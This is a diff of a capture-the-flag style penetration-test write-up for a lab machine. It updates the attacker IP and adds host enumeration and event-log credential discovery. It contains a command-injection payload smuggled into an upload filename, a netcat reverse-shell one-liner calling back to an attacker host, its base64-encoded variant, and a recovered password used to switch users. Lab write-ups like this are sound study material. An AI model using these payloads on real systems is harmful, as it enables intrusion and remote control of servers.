@@ -81,20 +81,21 @@ Interesting:
 ### Event Logs
 Interesting:
 - Domain:EFORENZICS-DI
-- accounts: SMorton,AAnderson,Administrator,
+- accounts: SMorton,AAnderson,Administrator,(a lot)
+
 
 ## Exploiting
 its enough to upload one image and save it into burpsuite repeater so you can edit the filename field within the form-data,
-to confirm the vulnerability was exploitable i used `filename="echo 'curl 10.10.14.70:8000' | bash |"` which did indeed call back to my host.
+to confirm the vulnerability was exploitable i used `filename="echo 'curl 10.10.14.58:8000' | bash |"` which did indeed call back to my host.
 
 if we add any other pipes to the command e.g. > the command will fail to run, however we can pass a b64 encoded command, pipe it to the base64 -d command to decode and pipe the result into bash to run it, which avoids the other pipes breaking it.
 
 ```
-curl 10.10.14.70:8000/?d=$(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.70 4444 >/tmp/f)
+curl 10.10.14.58:8000/?d=$(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.58 4444 >/tmp/f)
 b64 encoded:
 Y3VybCAxMC4xMC4xNC43MDo4MDAwLz9kPSQocm0gLWYgL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuNzAgNDQ0NCA+L3RtcC9mKQ==
 
-filename="echo 'Y3VybCAxMC4xMC4xNC43MDo4MDAwLz9kPSQocm0gLWYgL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuNzAgNDQ0NCA+L3RtcC9mKQ==' | base64 -d | bash |"
+filename="echo 'Y3VybCAxMC4xMC4xNC41ODo4MDAwLz9kPSQocm0gLWYgL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuNTggNDQ0NCA+L3RtcC9mKQ==' | base64 -d | bash |"
 
 ```
 
@@ -110,3 +111,32 @@ www-data
 ```
 
 We have internal access to the box!
+### Host info gathering
+Running linpeas first as we are in a linux server
+
+users with console:
+```
+root:x:0:0:root:/root:/bin/bash
+smorton:x:1000:1000:eForenzics:/home/smorton:/bin/bash
+```
+```
+══╣ Possible private SSH keys were found!
+/etc/ImageMagick-6/mime.xml
+```
+```
+╔══════════╣ Analyzing Other Interesting Files Files (limit 70)
+-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc
+
+```
+### Event Logs (part 2)
+I missed something important within the event log, i searched for the typical event ID:4624 which is successful login, but i did not check 4625, where we can find someone trying to login with the password as the username! Silly!
+Password found `Def@ultf0r3nz!csPa$$`
+
+```
+$ su smorton 
+Password: Def@ultf0r3nz!csPa$$
+whoami
+smorton
+
+```
+and we're in to a legit user!
